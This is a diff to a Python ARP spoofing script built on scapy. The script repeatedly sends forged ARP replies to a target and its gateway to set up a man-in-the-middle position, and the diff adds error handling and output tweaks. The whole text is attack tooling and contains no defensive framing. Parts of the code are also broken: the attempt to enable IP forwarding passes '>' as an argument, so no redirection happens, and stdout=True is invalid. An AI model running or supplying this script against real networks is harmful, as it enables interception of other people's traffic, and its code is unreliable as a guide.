@@ -1,5 +1,4 @@
 #!/usr/bin/env python
-import sys
 
 import scapy.all as scapy
 import argparse
@@ -21,7 +20,7 @@ def get_arguments():
 
 
 def enable_prot_forwarding():
-    subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"], stdout=subprocess.DEVNULL)
+    subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"], stdout=True)
 
 
 def get_mac(ip):
@@ -58,10 +57,14 @@ sent_packets_count = 0
 
 try:
     while True:
-        spoof(target_ip, gateway_ip)
+        try:
+            spoof(target_ip, gateway_ip)
+        except IndexError:
+            pass
+            print("Could not find the target !!")
         spoof(gateway_ip, target_ip)
         sent_packets_count += 2
-        print("\r[+] Sent Packets: " + str(sent_packets_count), end="")
+        print("\r[+] Sent Packets: " + str(sent_packets_count), end='')
         time.sleep(2)
 
 except KeyboardInterrupt:
